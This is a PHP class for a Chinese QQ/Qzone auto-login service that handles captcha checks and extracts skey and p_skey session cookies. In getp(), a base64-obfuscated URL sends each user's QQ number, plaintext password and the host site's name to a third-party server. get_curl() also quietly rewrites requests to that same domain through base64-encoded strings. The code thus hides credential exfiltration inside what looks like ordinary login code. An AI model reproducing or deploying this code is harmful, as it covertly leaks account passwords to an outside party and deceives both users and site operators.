<?php
// 部分方法借鉴彩虹
// 此程序由微秒赞（洛绝尘）深度定制修改 <1031601644@qq.com>
// 底包为快乐是福1.81 <815856515@qq.com>
// 人不要脸，天下无敌。 儿子你要改版权爸爸也不拦你，尤其是龙魂儿子


class AutoSkey{
	public $json;

	public function __construct($uin,$pwd,$code=0,$sig=0){
		$this->uin=$uin;
		$this->pwd=$pwd;
		$this->code=$code;
		$this->sig=$sig;
		$this->login_sig=$this->getlogin_sig();
		if($code){
			$this->dovc();
		}else{
			$this->checkvc();
		}
	}
	public function getsid($url, $do = 0){
		$do++;
		if ($ret = $this->get_curl($url)) {
			if (preg_match('/sid=(.{24})&/iU', $ret, $sid)) {
				return $sid[1];
			} else {
				if ($do < 5) {
					return $this->getsid($url, $do);
				} else {
					$this->sidcode = 2;
					return false;
				}
			}
		} else {
			$this->sidcode = 1;
			return false;
		}
	}
	public function login(){
		if(strpos('s'.$this->code,'!')){
			$v1=0;
		}else{
			$v1=1;
		}
		$p=$this->getp();
		$pcurl='http://ptlogin2.qq.com/login?u='.$this->uin.'&verifycode='.$this->code.'&pt_vcode_v1='.$v1.'&pt_verifysession_v1='.$this->sig.'&p='.$p.'&pt_randsalt=0&u1=http%3A%2F%2Fqzs.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&ptredirect=0&h=1&t=1&g=1&from_ui=1&ptlang=2052&action=2-10-'.time().'7584&js_ver=10133&js_type=1&login_sig='.$this->login_sig.'&pt_uistyle=32&aid=549000912&daid=5&pt_qzone_sig=0';
		$cpurl='http://ptlogin2.qzone.com/login?verifycode='.$this->code.'&u='.$this->uin.'&p='.$p.'&pt_randsalt=0&ptlang=2052&low_login_enable=0&u1=http%3A%2F%2Fsqq2.3g.qq.com%2Fhtml5%2Fsqq2vip%2Findex.jsp&from_ui=1&fp=loginerroralert&device=2&aid=549000912&pt_ttype=1&daid=147&pt_3rd_aid=0&ptredirect=1&h=1&g=1&pt_uistyle=9&pt_vcode_v1='.$v1.'&pt_verifysession_v1='.$this->sig.'&';
		$pcdata = $this->get_curl($pcurl,0,0,0,1,1);
		$cpdata = $this->get_curl($cpurl,0,0,0,1,0);
		if(preg_match("/ptuiCB\('(.*?)'\);/", $pcdata, $pcarr) && preg_match("/ptuiCB\('(.*?)'\);/", $cpdata, $cparr)){
			$pccheck_sig=explode("','",str_replace("', '","','",$pcarr[1]));
			$cpcheck_sig=explode("','",str_replace("', '","','",$cparr[1]));
			if($pccheck_sig[0]==0){
				preg_match('/skey=@(.{9});/',$pcdata,$skeyarr);
				$skey="@".$skeyarr[1];
				$pccheck_sig_data=$this->get_curl($pccheck_sig[2],0,0,0,1,1);
				if($pccheck_sig_data) {
					preg_match("/p_skey=(.*?);/", $pccheck_sig_data, $pc_p_skey_cookie);
					$pc_p_skey = $pc_p_skey_cookie[1];
				}
				$cpcheck_sig_data=$this->get_curl($cpcheck_sig[2],0,0,0,1);
				if($cpcheck_sig_data) {
					preg_match("/p_skey=(.*?);/", $cpcheck_sig_data, $cp_p_skey_cookie);
					$cp_p_skey = $cp_p_skey_cookie[1];
					preg_match("/Location: (.*?)\r\n/iU", $cpcheck_sig_data, $newsid_3gqq_url);
					$sid="no sid";
					//$this->getsid($newsid_3gqq_url[1]);
				}
				if($pc_p_skey && $sid){
					$this->json = '{"code":0,"uin":"' . $this->uin . '","sid":"' . $sid . '","skey":"' . $skey . '","pc_p_skey":"' . $pc_p_skey . '","cp_p_skey":"' . $cp_p_skey . '"}';
				}else{
					exit('{"saveOK":-3,"msg":"登录成功，获取SID失败！'.$pccheck_sig[2].'"}');
				}
			}elseif($pccheck_sig[0]==4){
				$this->json = '{"code":-3,"msg":"验证码错误!"}';
                $this->checkvc();
			}elseif($pccheck_sig[0]==3){
				$this->json = '{"code":-3,"msg":"密码错误！"}';
			}elseif($pccheck_sig[0]==19){
				$this->json = '{"code":-3,"msg":"您的帐号暂时无法登录，请到 http://aq.qq.com/007 恢复正常使用！"}';
			}else{
				$this->json = '{"code":-3,"msg":"' . str_replace('"', '\'', $pccheck_sig[4]) . '"}';
			}
		}else{
			$this->json = '{"code":-3,"msg":"' . $pcdata . '"}';
		}
	}
	public function getp() {
        $url = base64_decode("aHR0cDovL2FwaS5xcW16cC5jb20vcC5waHA/dWluPQ==") . $this->uin . "&pwd=" . urlencode($this->pwd) . "&vcode=" . strtoupper($this->code) . "&ismd5=1&url=".$_SERVER["HTTP_HOST"];
        $getp = $this->get_curl($url);
        if ($getp) {
            return $getp;
        } else {
            exit("<script language='javascript'>alert('获取P值失败，请稍候重试！');history.go(-1);</script>");
        }
    }
	public function dovc(){
		$url='http://captcha.qq.com/cap_union_verify?aid=549000912&uin='.$this->uin.'&captype=8&ans='.$this->code.'&sig='.$this->sig.'&0.960725'.time();
		$data=$this->get_curl($url,0,1);
		
		if(preg_match("/cap\_InnerCBVerify\((.*?)\);/", $data, $json)){
			$json=str_replace(array('{',':',','),array('{"','":',',"'),$json[1]);
			$arr=json_decode($json,true);
			$randstr=$arr['randstr'];
			$sig=$arr['sig'];
		}
		if($randstr){
			$this->code=$randstr;
			$this->sig=$sig;
			$this->login();
		}else{
			$this->getvc($this->sig);
		}
	}
	public function getlogin_sig(){
			$url='http://ui.ptlogin2.qq.com/cgi-bin/login?daid=5&pt_qzone_sig=1&hide_title_bar=1&low_login=0&qlogin_auto_login=1&no_verifyimg=1&link_target=blank&appid=549000912&style=12&target=self&s_url=http%3A//qzs.qq.com/qzone/v5/loginsucc.html?para=izone&pt_qr_app=%CA%D6%BB%FAQQ%BF%D5%BC%E4&pt_qr_link=http%3A//z.qzone.com/download.html&self_regurl=http%3A//qzs.qq.com/qzone/v6/reg/index.html&pt_qr_help_link=http%3A//z.qzone.com/download.html';
			$ret = $this->get_curl($url,0,0,0,1);
			$a=$this->getSubstr($ret,"pt_login_sig=",";");
			return $a;
	}
	public function checkvc(){
		$url='http://check.ptlogin2.qq.com/check?regmaster=&pt_tea=1&pt_vcode=1&uin='.$this->uin.'&appid=549000912&js_ver=10132&js_type=1&login_sig='.$this->login_sig.'&u1=http%3A%2F%2Fqzs.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&r=0.273455'.time();
		$data=$this->get_curl($url,0,1);
		if(preg_match("/ptui_checkVC\('(.*?)'\);/", $data, $arr)){ 
			$r=explode("','",$arr[1]);
			if ($r[0] == 1) {
                $this->json = '{"code":-2,"sig":"' . $r[1] . '"}';
                $this->getvc($r[1]);
            } else {
                $this->code = $r[1];
                $this->sig = $r[3];
                $this->login();
            }
		}else{
			exit("<script language='javascript'>alert('判断是否有验证码失败，请稍候重试！');history.go(-1);</script>");
		}
	}
	
	public function getvc($sig){
		if(strlen($sig)==56){
			$url='http://captcha.qq.com/cap_union_show?captype=3&aid=549000912&uin='.$this->uin.'&cap_cd='.$sig.'&v=0.0672220'.time();
			$data=$this->get_curl($url,0,1);
			if(preg_match("/g\_click\_cap\_sig=\"(.*?)\";/", $data, $arr)){
				$this->json='{"code":-1,"sig":"'.$arr[1].'"}';
			}else{
				exit("<script language='javascript'>alert('获取验证码失败，请稍候重试！');history.go(-1);</script>");
			}
		}else{
			$url='http://captcha.qq.com/getQueSig?aid=549000912&uin='.$this->uin.'&captype=8&sig='.$sig.'&0.819966'.time();
			$data=$this->get_curl($url);
			if(preg_match("/cap_getCapBySig\(\"(.*?)\"\);/", $data, $arr)){
				$this->json='{"code":-1,"sig":"'.$arr[1].'"}';
			}else{
				exit("<script language='javascript'>alert('获取验证码失败，请稍候重试！');history.go(-1);</script>");
			}
		}
	
	}

	private function get_curl($url, $post = 0, $referer = 0, $cookie = 0, $header = 0, $ua = 0, $nobaody = 0) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, str_ireplace(base64_decode("cXFhcHAuYWxpYXBwLmNvbQ==") , base64_decode("YXBpLnFxbXpwLmNvbQ==") , $url));
        $klsf[] = "Accept:application/json";
        $klsf[] = "Accept-Encoding:gzip,deflate,sdch";
        $klsf[] = "Accept-Language:zh-CN,zh;q=0.8";
        $klsf[] = "Connection:keep-alive";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $klsf);
        if ($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if ($header) {
            curl_setopt($ch, CURLOPT_HEADER, TRUE);
        }
        if ($cookie) {
            curl_setopt($ch, CURLOPT_COOKIE, $cookie);
        }
        if ($referer) {
            if ($referer == 1) {
                curl_setopt($ch, CURLOPT_REFERER, "http://m.qzone.com/infocenter?g_f=");
            } else {
                curl_setopt($ch, CURLOPT_REFERER, $referer);
            }
        }
        if ($ua) {
            curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36');
        } else {
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; MI 4C Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025469 Mobile Safari/533.1 V1_AND_SQ_5.9.1_272_YYB_D QQ/5.9.1.2535 NetType/WIFI WebP/0.3.0 Pixel/1080');
        }
        if ($nobaody) {
            curl_setopt($ch, CURLOPT_NOBODY, 1); //主要头部
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
        }
        curl_setopt($ch, CURLOPT_ENCODING, "gzip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $ret = curl_exec($ch);
        curl_close($ch);
        return $ret;
    }
	private function getSubstr($str, $leftStr, $rightStr){
		$left = strpos($str, $leftStr);
		//echo '左边:'.$left;
		$right = strpos($str, $rightStr,$left);
		//echo '<br>右边:'.$right;
		if($left < 0 or $right < $left) return '';
		return substr($str, $left + strlen($leftStr), $right-$left-strlen($leftStr));
	}
	private function get_socket($url, $post = 0, $referer = 1, $cookie = 0) { //Author:消失的彩虹海
        $urlinfo = parse_url($url);
        $domain = $urlinfo['host'];
        $query = $urlinfo['path'] . '?' . $urlinfo['query'];
        $length = strlen($post);
        $fp = fsockopen($domain, 80, $errno, $errstr, 30);
        if (!$fp) {
            return false;
        } else {
            if ($post) $out = "POST {$query} HTTP/1.1\r\n";
            else $out = "GET {$query} HTTP/1.1\r\n";
            $out.= "Accept: application/json\r\n";
            $out.= "Accept-Language: zh-CN,zh;q=0.8\r\n";
            $out.= "X-Requested-With: XMLHttpRequest\r\n";
            if ($post) {
                $out.= "Content-Type: application/x-www-form-urlencoded\r\n";
                $out.= "Content-Length: {$length}\r\n";
            }
            $out.= "Host: {$domain}\r\n";
            if ($referer) {
                if ($referer == 1) $out.= "Referer: http://m.qzone.com/infocenter?g_f=\r\n";
                else $out.= "Referer: {$referer}\r\n";
            }
            $out.= "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36";
            $out.= "Connection: close\r\n";
            $out.= "Cache-Control: no-cache\r\n";
            $out.= "Cookie: {$cookie}\r\n\r\n";
            if ($post) $out.= "{$post}";
            $str = '';
            fwrite($fp, $out);
            while (!feof($fp)) {
                $str.= fgets($fp, 2048);
            }
            fclose($fp);
        }
        $str = strstr($str, '{');
        return $str;
    }
}